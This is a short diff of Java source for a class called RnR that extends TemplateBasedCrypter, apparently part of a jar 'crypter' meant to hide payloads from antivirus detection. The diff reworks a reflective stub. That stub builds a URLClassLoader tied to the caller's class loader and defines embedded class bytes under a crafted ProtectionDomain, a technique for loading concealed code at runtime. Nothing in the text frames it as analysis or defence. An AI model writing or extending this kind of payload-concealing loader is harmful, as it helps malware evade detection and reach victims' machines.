@@ -47,6 +47,8 @@ import java.security.ProtectionDomain;
 import java.security.cert.Certificate;
 import java.util.Random;
 
+import sun.reflect.Reflection;
+
 public class RnR extends TemplateBasedCrypter {
 
 	public RnR() {
@@ -61,11 +63,11 @@ public class RnR extends TemplateBasedCrypter {
 
 		// line 2
 		oos.writeObject(new Object[] { null, new Object[] { null, innerClassBytes, new Integer(0), new Integer(innerClassBytes.length), null } });
+		oos.writeObject(new Object[] { new URL[0], null });
 
 		// line 3
 		oos.writeUTF("java.net.URLClassLoader");
-		oos.writeObject(new Class[] { URL[].class });
-		oos.writeObject(new Object[] { new URL[0] });
+		oos.writeObject(new Class[] { URL[].class, ClassLoader.class });
 
 		// line 4
 		oos.writeUTF("java.security.ProtectionDomain");
@@ -115,8 +117,8 @@ public class RnR extends TemplateBasedCrypter {
 		}
 		// line 1:
 		ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(data));
-		Object[] arx = (Object[]) in.readObject();
-		arx[0] = Class.forName(in.readUTF()).getConstructor((Class[]) in.readObject()).newInstance((Object[]) in.readObject());
+		Object[] arx = (Object[]) in.readObject(), uclarx = (Object[])in.readObject();
+		uclarx[1] = Reflection.getCallerClass(1).getClassLoader(); arx[0] = Class.forName(in.readUTF()).getConstructor((Class[]) in.readObject()).newInstance(uclarx);
 		((Object[]) arx[1])[4] = Class.forName(in.readUTF()).getConstructor((Class[]) in.readObject()).newInstance((Object[]) in.readObject());
 		Object _ClassLoader = Class.forName(in.readUTF());
 		// line 6:
